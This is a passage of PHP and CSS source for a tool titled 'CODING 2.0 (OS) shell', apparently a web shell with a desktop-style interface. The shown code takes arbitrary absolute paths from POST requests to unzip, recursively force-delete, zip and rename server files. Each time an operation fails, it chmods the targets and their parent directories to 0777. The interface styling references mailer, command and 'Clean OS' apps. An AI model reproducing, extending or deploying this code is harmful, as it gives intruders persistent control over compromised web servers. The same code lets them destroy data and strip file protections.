                            } else {
                                $fileWritable = is_writable($zipPath) ? 'yes' : 'no';
                                $dirWritable = is_writable($finalDir) ? 'yes' : 'no';
                                $filePerm = sprintf('%o', @fileperms($zipPath) & 0777);
                                $dirPerm = sprintf('%o', @fileperms($finalDir) & 0777);
                                $error = 'Unzip failed: extraction error.';
                            }
                        } else {
                            $error = 'Unzip failed: cannot open zip file.';
                        }
                    }
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $error = 'Unzip failed: cannot create target directory.';
                }
            }
        } else {
            $error = 'Unzip failed: invalid absolute zip file.';
        }
    }
    // Delete file or folder (absolute path)
    if (isset($_POST['do_delete_abs']) && isset($_POST['os'])) {
        $target = realpath((string)$_POST['os']);
        if ($target !== false && (is_file($target) || is_dir($target))) {
            if (is_file($target)) {
                $dir = dirname($target);
                
                // Enhanced permission fixing for files
                $forceDeleteFile = function($filePath) {
                    $parentDir = dirname($filePath);
                    
                    // Try multiple permission combinations
                    // Common and Recommended Permission Combinations
                    $attempts = [
                        // Standard Secure: Owner R/W/X, Group R/X, Others R/X
                        // Files: Owner R/W, Group R, Others R
                        ['file' => 0644, 'dir' => 0755],

                        // Private: Only Owner has access
                        ['file' => 0600, 'dir' => 0700],

                        // Group Access: Owner & Group R/W/X, Others no access
                        // Files: Owner & Group R/W
                        ['file' => 0660, 'dir' => 0770],

                        // Shared Group: Owner & Group R/W/X, Others can Read only
                        // Files: Owner & Group R/W, Others R
                        ['file' => 0664, 'dir' => 0775],
                        
                        // Original Attempt 1: Highly permissive files, standard directories
                        ['file' => 0666, 'dir' => 0755],

                        // Original Attempt 2: Fully permissive files, group-shared directories
                        ['file' => 0777, 'dir' => 0775],
                        
                        // Original Attempt 3 (Last Resort): Fully permissive (insecure)
                        ['file' => 0777, 'dir' => 0777],
                    ];
                    
                    foreach ($attempts as $perms) {
                        @chmod($filePath, $perms['file']);
                        @chmod($parentDir, $perms['dir']);
                        clearstatcache(true, $filePath);
                        clearstatcache(true, $parentDir);
                        
                        if (@unlink($filePath)) {
                            return true;
                        }
                    }
                    return false;
                };
                
                $ok = $forceDeleteFile($target);
                if ($ok) {
                    // Log deleted file name with timestamp and absolute path
                    try { @file_put_contents($trashLog, (string)time() . "\tfile\t" . basename($target) . "\t" . $target . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $dir;
                } else {
                    $fileWritable = is_writable($target) ? 'yes' : 'no';
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $filePerm = sprintf('%o', @fileperms($target) & 0777);
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove file (abs). File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm . '. ' . describeOwnership($target, $dir) . ' Last error: ' . $lastMsg;
                }
            } else {
                $dir = $target;
                $parent = dirname($dir);
                
                // Enhanced recursive delete with aggressive permission fixing
                $forceDeleteRecursive = function(string $d) use (&$forceDeleteRecursive): bool {
                    if (!is_dir($d)) return false;
                    
                    // First pass: fix all permissions recursively
                    recursiveChmod($d, 0777, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true);
                    
                    $items = @scandir($d);
                    if ($items === false) return false;
                    
                    foreach ($items as $it) {
                        if ($it === '.' || $it === '..') continue;
                        $p = $d . DIRECTORY_SEPARATOR . $it;
                        
                        if (is_dir($p)) {
                            // Recursively delete subdirectories
                            if (!$forceDeleteRecursive($p)) {
                                // If normal delete fails, try aggressive permission fix
                                @chmod($p, 0777);
                                @chmod($d, 0777);
                                clearstatcache(true, $p);
                                if (!$forceDeleteRecursive($p)) return false;
                            }
                        } else {
                            // Delete files with permission fixing
                            @chmod($p, 0777);
                            @chmod($d, 0777);
                            clearstatcache(true, $p);
                            if (!@unlink($p)) {
                                // Try different permission combinations
                                @chmod($p, 0666);
                                clearstatcache(true, $p);
                                if (!@unlink($p)) return false;
                            }
                        }
                    }
                    
                    // Finally remove the directory itself
                    @chmod($d, 0777);
                    @chmod(dirname($d), 0777);
                    clearstatcache(true, $d);
                    return @rmdir($d);
                };
                
                $ok = $forceDeleteRecursive($dir);
                if ($ok) {
                    // Log deleted folder name with timestamp and absolute path
                    try { @file_put_contents($trashLog, (string)time() . "\tfolder\t" . basename($dir) . "\t" . $dir . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dir) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $lastErr = error_get_last();
                    $lastMsg = $lastErr['message'] ?? 'n/a';
                    $error = 'Delete failed: unable to remove folder (abs). Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm . '. ' . describeOwnership($dir, $parent) . ' Last error: ' . $lastMsg;
                }
            }
        } else {
            $error = 'Delete failed: invalid absolute path.';
        }
    }
    // Zip folder (absolute path)
    if (isset($_POST['do_zip_abs']) && isset($_POST['os'])) {
        $dirPath = realpath((string)$_POST['os']);
        if ($dirPath !== false && is_dir($dirPath)) {
            $zipname = trim((string)($_POST['zipname'] ?? (date('Ymd-His') . '-zip.zip')));
            if ($zipname === '' || strpbrk($zipname, "\\/\0") !== false) {
                $error = 'Zip failed: invalid archive name.';
            } else {
                if (strtolower(pathinfo($zipname, PATHINFO_EXTENSION)) !== 'zip') {
                    $zipname .= '.zip';
                }
                $parent = dirname($dirPath);
                $base = pathinfo($zipname, PATHINFO_FILENAME);
                $zipPath = $parent . DIRECTORY_SEPARATOR . $zipname;
                $finalZip = $zipPath;
                if (file_exists($finalZip)) {
                    for ($i = 1; $i <= 99; $i++) {
                        $candidate = $parent . DIRECTORY_SEPARATOR . $base . '-' . $i . '.zip';
                        if (!file_exists($candidate)) { $finalZip = $candidate; break; }
                    }
                }
                $ok = zipDirectory($dirPath, $finalZip);
                if (!$ok) {
                    @chmod($parent, 0775);
                    clearstatcache(true, $parent);
                    $ok = zipDirectory($dirPath, $finalZip);
                    if (!$ok) {
                        @chmod($parent, 0777);
                        clearstatcache(true, $parent);
                        $ok = zipDirectory($dirPath, $finalZip);
                    }
                }
                if ($ok) {
                    $notice = 'Done';
                    $currentDir = $parent;
                } else {
                    $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
                    $parentWritable = is_writable($parent) ? 'yes' : 'no';
                    $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
                    $parentPerm = sprintf('%o', @fileperms($parent) & 0777);
                    $error = 'Zip failed: unable to create archive (abs).' . (class_exists('ZipArchive') ? '' : ' ZipArchive extension not available.');
                }
            }
        } else {
            $error = 'Zip failed: invalid absolute folder path.';
        }
    }
    // Rename file or folder (absolute path)
    if (isset($_POST['do_rename_abs']) && isset($_POST['os']) && isset($_POST['newname'])) {
        $oldPath = realpath((string)$_POST['os']);
        $newname = trim((string)$_POST['newname']);
        if ($oldPath !== false && (is_file($oldPath) || is_dir($oldPath))) {
            if ($newname === '' || strpbrk($newname, "\\/\0") !== false) {
                $error = 'Rename failed: invalid new name.';
            } else {
                $dir = dirname($oldPath);
                $newPath = $dir . DIRECTORY_SEPARATOR . $newname;
                $caseOnly = (strcasecmp(basename($oldPath), $newname) === 0) && (basename($oldPath) !== $newname);
                if (!$caseOnly && file_exists($newPath)) {
                    $error = 'Rename failed: a file or folder with that name exists.';
                } else {
                    // Ensure parent directory is writable; try chmod escalation if needed
                    if (!is_writable($dir)) {
                        @chmod($dir, 0775);
                        clearstatcache(true, $dir);
                    }
                    if (!is_writable($dir)) {
                        @chmod($dir, 0777);
                        clearstatcache(true, $dir);
                    }
                    if (!is_writable($dir)) {
                        $error = 'Rename failed: directory not writable even after chmod attempts (abs).';
                    } else {
                        $ok = @rename($oldPath, $newPath);
                        if (!$ok) {
                            if (is_dir($oldPath)) {
                                @chmod($oldPath, 0775);
                            } else {
                                @chmod($oldPath, 0666);
                            }
                            @chmod($dir, 0775);
                            clearstatcache(true, $oldPath);
                            clearstatcache(true, $dir);
                            $ok = @rename($oldPath, $newPath);
                            if (!$ok) {
                                if (is_dir($oldPath)) {
                                    @chmod($oldPath, 0777);
                                }
                                @chmod($dir, 0777);
                                clearstatcache(true, $oldPath);
                                clearstatcache(true, $dir);
                                $ok = @rename($oldPath, $newPath);
                            }
                        }
                        if (!$ok && $caseOnly) {
                            $tmpName = '.rename_tmp_' . strval(mt_rand()) . '_' . strval(time());
                            $tmpPath = $dir . DIRECTORY_SEPARATOR . $tmpName;
                            $step1 = @rename($oldPath, $tmpPath);
                        if ($step1) {
                            $ok = @rename($tmpPath, $newPath);
                            if (!$ok) {
                                @rename($tmpPath, $oldPath);
                            }
                        }
                    }
                    if (!$ok && is_file($oldPath)) {
                        $copied = @copy($oldPath, $newPath);
                        if ($copied) {
                            @unlink($oldPath);
                            $ok = file_exists($newPath) && !file_exists($oldPath);
                        }
                    }
                    if ($ok) {
                        $notice = 'Done';
                        $currentDir = dirname($newPath);
                    } else {
                        $fileWritable = is_writable($oldPath) ? 'yes' : 'no';
                        $dirWritable = is_writable($dir) ? 'yes' : 'no';
                        $filePerm = sprintf('%o', @fileperms($oldPath) & 0777);
                        $dirPerm = sprintf('%o', @fileperms($dir) & 0777);
                        $lastErr = error_get_last();
                        $lastMsg = $lastErr['message'] ?? 'n/a';
                        $error = 'Rename failed: unable to rename (abs). Path writable: ' . $fileWritable . ', parent writable: ' . $dirWritable . ', path perms: ' . $filePerm . ', parent perms: ' . $dirPerm . '. Tried chmod: files->0666, dirs->0775/0777; parent->0775/0777. Last error: ' . $lastMsg;
                    }
                    }
                }
            }
        } else {
            $error = 'Rename failed: invalid absolute file path.';
        }
    }
}
// If the request was a form POST (not API), redirect to GET to avoid browser resubmission prompts
if (($_SERVER['REQUEST_METHOD'] ?? '') === 'POST' && !isset($_POST['api'])) {
    $qs = '?os=' . rawurlencode($currentDir);
    if (!empty($notice)) { $qs .= '&n=' . rawurlencode($notice); }
    if (!empty($error)) { $qs .= '&err=' . rawurlencode($error); }
    header('Location: ' . $qs, true, 303);
    exit;
}
$entries = @scandir($currentDir);
if (!is_array($entries)) $entries = [];
// Sort by type priority: folders (0), PHP (1), HTML (2), other files (3), ZIP last (4), then by name
usort($entries, function($a, $b) use ($currentDir) {
    // Keep special entries orderless; they are skipped later
    if ($a === '.' || $a === '..') return ($b === '.' || $b === '..') ? 0 : -1;
    if ($b === '.' || $b === '..') return 1;
    $fa = $currentDir . DIRECTORY_SEPARATOR . $a;
    $fb = $currentDir . DIRECTORY_SEPARATOR . $b;
    $da = is_dir($fa);
    $db = is_dir($fb);
    // Compute type priority
    $pa = $da ? 0 : (function($path) {
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        if ($ext === 'php') return 1;
        if ($ext === 'html' || $ext === 'htm') return 2;
        if ($ext === 'zip') return 4; // last
        return 3; // other files
    })($fa);
    $pb = $db ? 0 : (function($path) {
        $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        if ($ext === 'php') return 1;
        if ($ext === 'html' || $ext === 'htm') return 2;
        if ($ext === 'zip') return 4; // last
        return 3; // other files
    })($fb);
    if ($pa < $pb) return -1;
    if ($pa > $pb) return 1;
    // Same priority: sort by name (case-insensitive)
    return strcasecmp($a, $b);
});
$parent = dirname($currentDir);
$canGoUp = ($parent !== $currentDir) && (strpos($parent, $BASE_DIR) === 0);
// Desktop-style wallpaper support: allow ?wallpaper=<url or local filename>
// Default set to user-provided preferred wallpaper
$defaultWallpaper = 'https://images7.alphacoders.com/567/thumb-1920-567918.png';
$wp = isset($_GET['wallpaper']) ? trim((string)$_GET['wallpaper']) : '';
if ($wp === '') {
    $wallpaperUrl = $defaultWallpaper;
} elseif (preg_match('/^https?:\/\//i', $wp)) {
    // Remote HTTP(S) image
    $wallpaperUrl = $wp;
} else {
    // Local file in current directory; prevent traversal
    $safeLocal = basename($wp);
    $localPath = $BASE_DIR . DIRECTORY_SEPARATOR . $safeLocal;
    if ($safeLocal !== '' && file_exists($localPath)) {
        // Use relative URL so the PHP built-in server can serve it
        $wallpaperUrl = $safeLocal;
    } else {
        $wallpaperUrl = $defaultWallpaper;
    }
}
// Determine if we should show post-login success overlay (flash)
$loginFlash = !empty($_SESSION['login_flash']);
if ($loginFlash) { unset($_SESSION['login_flash']); }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CODING 2.0 (OS) shell - <?= h($_SERVER['SERVER_NAME'] ?? 'localhost'); ?></title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <script>
    (function(){
      var svg = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='9' fill='none' stroke='Chartreuse' stroke-width='3' opacity='0.28'/><path d='M6 12a6 6 0 1 1 12 0' fill='none' stroke='#e6eef7' stroke-width='3' stroke-linecap='round'/><circle cx='12' cy='12' r='2' fill='Chartreuse'/><circle cx='12' cy='12' r='9' fill='none' stroke='Chartreuse' stroke-width='3' stroke-linecap='round' stroke-dasharray='56' stroke-dashoffset='42'/></svg>";
      var url = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
      var link = document.createElement('link');
      link.setAttribute('rel','icon');
      link.setAttribute('type','image/svg+xml');
      link.setAttribute('href', url);
      document.head.appendChild(link);
    })();
    </script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,500,1,0" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <script>
    // Set saved wallpaper ASAP to avoid default flash on refresh
    (function(){
      try {
        var saved = localStorage.getItem('coding.wallpaper');
        if (saved && typeof saved === 'string' && saved.length > 0) {
          var isGradient = /^\s*(?:linear|radial)-gradient\(/.test(saved);
          var cssVal = isGradient ? saved : "url('" + saved.replace(/'/g, "\\'") + "')";
          document.documentElement.style.setProperty('--wallpaper', cssVal);
        }
      } catch(e) {}
    })();
    </script>
    <style>
        :root { color-scheme: dark; --bg:#000000; --border:rgba(255,255,255,0.08); --text:#e8f0f7; --muted:#a0aab8; --accent:Chartreuse; --accentDim:Chartreuse; --danger:#ff8b8b; --wallpaper: url('<?= h($wallpaperUrl) ?>'); --wallpaperFallback: radial-gradient(1200px 600px at 10% 10%, #0b0b0b 0%, #0a0c10 45%, #0a0c10 100%); --acrylic: 0.58; --shadow: rgba(0,0,0,0.6); }
        body { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; background:#000; color:var(--text); margin:0; font-size: var(--textBase, 14px); }
        /* Laptop desktop wallpaper */
        body::before { content:""; position:fixed; inset:0; background-image: var(--wallpaper), var(--wallpaperFallback); background-size: cover, cover; background-position: center, center; background-repeat: no-repeat, no-repeat; background-attachment: fixed, fixed; z-index:-1; }
        header { padding:16px 24px; border-bottom:1px solid var(--border); background:transparent; position:sticky; top:0; z-index:5; }
.header-bar { display:flex; align-items:center; justify-content:space-between; gap:12px; background: rgba(46,49,57,0.50); border:1px solid var(--border); border-radius:12px; padding:10px 18px; backdrop-filter: blur(8px) saturate(120%); box-shadow: 0 10px 20px rgba(0,0,0,0.28); }
.app-icons { display:flex; align-items:center; gap:12px; }
.app-icon { position: relative; }
        .app-icon::after { content: attr(data-label); position: absolute; bottom: 100%; left: 50%; transform: translateX(-50%) translateY(-2px); background: rgba(24,26,32,0.85); border:1px solid var(--border); color:#cfd6df; padding:2px 6px; border-radius:6px; font-size:12px; white-space: nowrap; opacity:0; pointer-events: none; transition: opacity .15s ease, transform .15s ease; z-index: 1000; }
        .app-icon:hover::after { opacity:1; transform: translateX(-50%) translateY(0); }
.app-icon { width:38px; height:38px; display:flex; align-items:center; justify-content:center; border-radius:12px; color:#cfd6df; text-decoration:none; 
  background: linear-gradient(180deg, rgba(40,44,52,0.92), rgba(20,24,28,0.92));
  box-shadow: inset 0 1px 0 rgba(255,255,255,0.06), 0 8px 16px rgba(0,0,0,0.35);
  backdrop-filter: blur(6px) saturate(115%);
  border: 1px solid rgba(255,255,255,0.06);
  transition: background .15s ease, box-shadow .15s ease;
}
.app-icon:hover { background: linear-gradient(180deg, rgba(48,52,60,0.94), rgba(28,32,36,0.94)); box-shadow: inset 0 1px 0 rgba(255,255,255,0.08), 0 10px 18px rgba(0,0,0,0.4); }
        .app-icon .fa-brands { font-size:24px; }
        .app-icon .material-symbols-rounded { font-size:24px; vertical-align:baseline; }
/* Standard icon sizing for all header app icons */
    .app-icon svg, .app-icon .material-symbols-rounded { width:24px; height:24px; display:block; }
    .app-icon .mailer-icon-svg { width:24px; height:24px; }
.app-icon img { width:24px; height:24px; display:block; }
#logout-trigger { color: DarkRed; }
#logout-trigger .logout-icon { width:24px; height:24px; display:block; }
#logout-trigger .logout-icon path { stroke-width:2; stroke-linecap:round; stroke-linejoin:round; }
#logout-trigger .logout-icon circle, #logout-trigger .logout-icon line { stroke: currentColor; fill: none; stroke-width:2; stroke-linecap:round; }
#logout-trigger .logout-icon .ring { stroke-dasharray: 44 8; stroke-dashoffset: 4; }

#wallpaper-trigger .wp-wrap { width:24px; height:24px; position:relative; display:block; overflow:hidden; }
#wallpaper-trigger .center { display:flex; justify-content:center; align-items:center; }
#wallpaper-trigger .design { height:200px; width:200px; border-radius:40px; background: linear-gradient(180deg, rgba(255,11,0,1) 13%, rgba(255,158,0,1) 100%); position: absolute; left:50%; top:50%; transform: translate(-50%, -50%) scale(0.12); transform-origin: center; overflow: hidden; }
#wallpaper-trigger .color-border { border-radius:50%; background-color:#ffffff20; box-shadow: 0 0 10px 2px rgba(0,0,0,0.1); }
#wallpaper-trigger .circle-1 { height:220px; width:220px; position:absolute; right:-50px; top:-50px; }
#wallpaper-trigger .circle-2 { height:180px; width:180px; }
#wallpaper-trigger .circle-3 { height:140px; width:140px; }
#wallpaper-trigger .circle-4 { height:105px; width:105px; }
#wallpaper-trigger .circle-5 { height:70px; width:70px; border-radius:50%; background-color:#ffffff; }
#wallpaper-trigger .shape { height:200px; width:200px; background-color:#484848; transform: rotate(45deg); position:absolute; }
#wallpaper-trigger .shadow { box-shadow: 0 0 20px 0 rgba(0,0,0,0.75); }
#wallpaper-trigger .mountain-1 { z-index:1; bottom:-100px; left:-100px; }
#wallpaper-trigger .mountain-2 { bottom:-110px; left:-30px; }
#wallpaper-trigger .mountain-3 { z-index:2; bottom:-150px; left:90px; }

#dock-wallpaper-btn .wp-wrap { width:28px; height:28px; position:relative; display:block; overflow:hidden; }
#dock-wallpaper-btn .center { display:flex; justify-content:center; align-items:center; }
#dock-wallpaper-btn .design { height:200px; width:200px; border-radius:40px; background: linear-gradient(180deg, rgba(255,11,0,1) 13%, rgba(255,158,0,1) 100%); position: absolute; left:50%; top:50%; transform: translate(-50%, -50%) scale(0.14); transform-origin: center; overflow: hidden; }
#dock-wallpaper-btn .color-border { border-radius:50%; background-color:#ffffff20; box-shadow: 0 0 10px 2px rgba(0,0,0,0.1); }
#dock-wallpaper-btn .circle-1 { height:220px; width:220px; position:absolute; right:-50px; top:-50px; }
#dock-wallpaper-btn .circle-2 { height:180px; width:180px; }
#dock-wallpaper-btn .circle-3 { height:140px; width:140px; }
#dock-wallpaper-btn .circle-4 { height:105px; width:105px; }
#dock-wallpaper-btn .circle-5 { height:70px; width:70px; border-radius:50%; background-color:#ffffff; }
#dock-wallpaper-btn .shape { height:200px; width:200px; background-color:#484848; transform: rotate(45deg); position:absolute; }
#dock-wallpaper-btn .shadow { box-shadow: 0 0 20px 0 rgba(0,0,0,0.75); }
#dock-wallpaper-btn .mountain-1 { z-index:1; bottom:-100px; left:-100px; }
#dock-wallpaper-btn .mountain-2 { bottom:-110px; left:-30px; }
#dock-wallpaper-btn .mountain-3 { z-index:2; bottom:-150px; left:90px; }

/* Mailer icon styles */

#dock-mailer-btn .mailer-icon { width:28px; height:28px; position:relative; display:flex; align-items:center; justify-content:center; background: Chartreuse; color:#000; border:none; border-radius:14px; transition: all .5s ease-in-out; overflow:hidden; }
#dock-mailer-btn .mailer-icon::before { content:""; background-image: url("data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyB3aWR0aD0iNzUycHQiIGhlaWdodD0iNzUycHQiIHZlcnNpb249IjEuMSIgdmlld0JveD0iMCAwIDc1MiA3NTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiA8cGF0aCBkPSJtNTczLjE4IDE5OC42MnYwbC0zOTYuMDkgNjMuNzE5Yy03Ljc1IDAuODU5MzgtOS40NzI3IDExLjE5NS0zLjQ0NTMgMTUuNWw5Ny4zMDEgNjguODgzLTE1LjUgMTEyLjhjLTAuODU5MzggNy43NSA3Ljc1IDEyLjkxNCAxMy43NzcgNy43NWw1NS4xMDktNDQuNzczIDI2LjY5MSAxMjQuODVjMS43MjI3IDcuNzUgMTEuMTk1IDkuNDcyNyAxNS41IDIuNTgybDIxNS4yNy0zMzguMzljMy40NDE0LTYuMDI3My0xLjcyNjYtMTMuNzc3LTguNjEzMy0xMi45MTR6bS0zNzIuODQgNzYuNjMzIDMxMy40Mi00OS45NDEtMjMzLjM0IDEwNy42M3ptNzQuMDUxIDE2NS4zMiAxMi45MTQtOTIuMTMzYzgwLjkzOC0zNy4wMjcgMTM5LjQ5LTY0LjU3OCAyMjkuMDQtMTA1LjkxLTEuNzE4OCAxLjcyMjctMC44NTkzNyAwLjg1OTM4LTI0MS45NSAxOTguMDR6bTg4LjY4OCA4Mi42Ni0yNC4xMDktMTEyLjggMTk5Ljc3LTE2Mi43NHoiIGZpbGw9IiNmZmYiLz4KPC9zdmc+Cg=="); width:22px; height:22px; background-repeat:no-repeat; background-size:100% 100%; position:absolute; transition: all .9s ease-in-out; margin-left:8%; }
.app-icon:hover #dock-mailer-btn .mailer-icon { border-radius:50%; }
.app-icon:hover #dock-mailer-btn .mailer-icon::before { margin-left:0%; transform: rotate(24deg); }
#dock-mailer-btn .mailer-icon-svg { width:28px; height:28px; }
    #cmd-trigger .material-symbols-rounded { color:#ffffff; }
    #cmdhelp-trigger .material-symbols-rounded { color:#cfd6df; }
    #how-trigger .material-symbols-rounded { color: Chartreuse; }
#notes-trigger .material-symbols-rounded { color: Khaki; }
#logout-trigger .material-symbols-rounded { color:#ff3b3b; }
.app-icon .trash-icon { width:24px; height:24px; display:block; }
#trash-trigger .trash-icon { color:#ffffff; }
#trash-trigger:hover .trash-icon { color:#ffffff; }
.app-icon .errors-icon { font-size:24px; }
#errors-trigger .errors-icon { color: DarkRed; }
        /* Header app icon brand colors */
        .app-icon .fa-chrome {
            background: conic-gradient(from 45deg at 50% 50%, #ea4335 0deg 90deg, #fbbc05 90deg 180deg, #34a853 180deg 270deg, #4285f4 270deg 360deg);
            -webkit-background-clip: text; background-clip: text; color: transparent;
        }
        .app-icon .ic-folder { color: Bisque; }
        /* Custom Browser OS icon (CODING-inspired C + spinner O) */
        .app-icon .browser-os-icon { width:24px; height:24px; }
        
        .browser-os-icon .c-letter { fill:#cfd6df; font-weight:800; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; font-size:14px; }
        .browser-os-icon circle.base { opacity:0.28; stroke:Chartreuse; }
        .browser-os-icon circle.dot { fill: Chartreuse; }
        .browser-os-icon circle.spin { transform-origin:12px 12px; animation: spin 1.2s linear infinite; stroke:Chartreuse; stroke-linecap: round; }
        /* Alternate Browser OS icon style */
    .app-icon .browser-os-icon-2 { width:24px; height:24px; }
    .browser-os-icon-2 .ring { stroke: Chartreuse; opacity:0.28; }
    .browser-os-icon-2 .c-arc { stroke: #e6eef7; }
    .browser-os-icon-2 .scan { stroke: Chartreuse; transform-origin:12px 12px; animation: spin 1.2s linear infinite; }
    .browser-os-icon-2 .dot { fill: Chartreuse; }

    /* Server Info app icon */
    .app-icon .serverinfo-icon { width:24px; height:24px; }
    .serverinfo-icon .eye-outline { stroke: Chartreuse; opacity:0.28; }
    .serverinfo-icon .pupil { fill: Chartreuse; }

    /* Server Info window */
.serverinfo-window { position: fixed; top: 160px; left: 200px; width: min(92vw, 560px); min-width: 360px; max-width: 92vw; min-height: 180px; max-height: 92vh; resize: both; overflow: auto; border:1px solid var(--border); border-radius: 12px; background: rgba(16,18,22,0.42); backdrop-filter: blur(10px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.30); color:#cfd6df; display:none; z-index: 10002; }
    .serverinfo-window.show { display:block; }
    .serverinfo-titlebar { display:flex; align-items:center; gap:8px; padding:8px 10px; border-bottom:1px solid var(--border); background: rgba(10,12,16,0.20); border-radius:12px 12px 0 0; cursor: move; user-select: none; }
    .serverinfo-title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
.serverinfo-close { width:26px; height:26px; border-radius:13px; border:1px solid var(--border); display:flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; cursor:pointer; }
.serverinfo-body { padding:12px; display:flex; flex-direction:column; gap:8px; max-height: none; overflow:hidden; }
.serverinfo-row { display:flex; align-items:flex-start; gap:10px; border:1px solid var(--border); border-radius:10px; padding:8px 10px; background: rgba(10,12,16,0.12); }
.serverinfo-row .label { width: 180px; min-width: 180px; color:#aab3be; display:flex; align-items:center; gap:8px; }
.serverinfo-row .label .material-symbols-rounded.icon { color:Chartreuse; font-size:18px; vertical-align:baseline; }
.serverinfo-row .value { flex:1; color:#cfd6df; word-break: break-word; display:flex; align-items:center; gap:8px; }
.serverinfo-row .value .truncate { flex: 1 1 auto; min-width: 0; max-width: 100%; width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; word-break: normal; display: block; }
.serverinfo-row .value .copy-icon { margin-left:auto; width:20px; height:20px; border:none; background:transparent; color:#cfd6df; opacity:.75; cursor:pointer; display:inline-flex; align-items:center; justify-content:center; padding:0; }
.serverinfo-row .value .copy-icon svg { width:16px; height:16px; fill: Chartreuse; }
.serverinfo-row .value .copy-icon:hover { opacity:1; }
.serverinfo-row .value .copy-icon.copied svg { fill: Chartreuse; }
.serverinfo-row .value .copyable { cursor: pointer; }
.serverinfo-row .value .copyable.copied { color: Chartreuse; }
.serverinfo-row .value .status-dot { width:10px; height:10px; border-radius:50%; display:inline-block; }
.serverinfo-row .value .status-text { font-weight:600; }
.serverinfo-row .value .status-green { background: Chartreuse; color: Chartreuse; }
.serverinfo-row .value .status-red { background:#ff3b3b; color:#ff3b3b; }
.serverinfo-row .value textarea.serverinfo-textarea { width:100%; min-height:84px; max-height:160px; resize:vertical; padding:8px; border:1px solid var(--border); border-radius:8px; background: rgba(10,12,16,0.08); color:#cfd6df; font-family: ui-monospace, Menlo, Consolas, monospace; line-height:1.5; transition: border-color .15s ease; }
.serverinfo-row .value textarea.serverinfo-textarea:focus { border-color: Chartreuse; outline: none; }
.serverinfo-row .value textarea.serverinfo-textarea:focus-visible { border-color: Chartreuse; }
.serverinfo-row .value textarea.serverinfo-textarea.singleline { height:32px; min-height:32px; max-height:32px; resize:horizontal; overflow-x:auto; overflow-y:hidden; white-space:nowrap; scrollbar-width: thin; scrollbar-color: Chartreuse rgba(0,0,0,0.35); }
.serverinfo-row .value textarea.serverinfo-textarea.singleline::-webkit-scrollbar { height:10px; }
    .serverinfo-actions { display:flex; align-items:center; justify-content:flex-end; gap:10px; padding:10px; border-top:1px solid var(--border); background: rgba(10,12,16,0.12); border-radius:0 0 12px 12px; }
    .serverinfo-actions .btn { display:inline-flex; align-items:center; gap:6px; }

    /* Clean OS app icon */
    .app-icon .clean-icon { width:24px; height:24px; display:block; }
    #clean-trigger .clean-icon { color: Chartreuse; }
    .clean-icon .broom-stick { stroke: Chartreuse; opacity:0.85; }
    .clean-icon .broom-head { stroke: #e6f7ea; }
    .clean-icon .broom-bristle { stroke: #a3e8bd; }
    .clean-icon .sparkle { stroke: Chartreuse; }
    .clean-icon .s1 { animation: sparkle 1.8s ease-in-out infinite; }
    .clean-icon .s2 { animation: sparkle 2.2s ease-in-out infinite; }
    .clean-icon .s3 { animation: sparkle 2.0s ease-in-out infinite; }
    .clean-icon .broom-head, .clean-icon .broom-bristle { transform-origin: 12px 12px; animation: sweep 1.6s ease-in-out infinite; }

    @keyframes sparkle {
        0% { transform: scale(0.8); opacity:0.6; }
        50% { transform: scale(1.2); opacity:1; }
        100% { transform: scale(0.8); opacity:0.6; }
    }
    @keyframes sweep {
        0% { transform: rotate(0deg); }
        50% { transform: rotate(8deg); }
        100% { transform: rotate(0deg); }
    }
    /* APPTools 1.0 app icon */
    .app-icon .apptools-icon { width:24px; height:24px; display:block; }
    #apptools-trigger .apptools-icon { color: Chartreuse; }
    .apptools-icon path, .apptools-icon circle { stroke: Chartreuse; }
    .apptools-icon .spin { transform-origin:12px 12px; animation: spin 1.4s linear infinite; }
    /* Icon tooltips for action buttons */
        .term-action[data-label], .btn-icon[data-label] { position: relative; }
        .term-action[data-label]::after, .btn-icon[data-label]::after {
            content: attr(data-label);
            position: absolute;
            left: 50%;
            transform: translateX(-50%) translateY(4px);
            bottom: -36px;
            background: #0b1320;
            color: #e2e8f0;
            border: 1px solid var(--border);
            border-radius: 6px;
            padding: 4px 8px;
            font-size: 12px;
            white-space: nowrap;
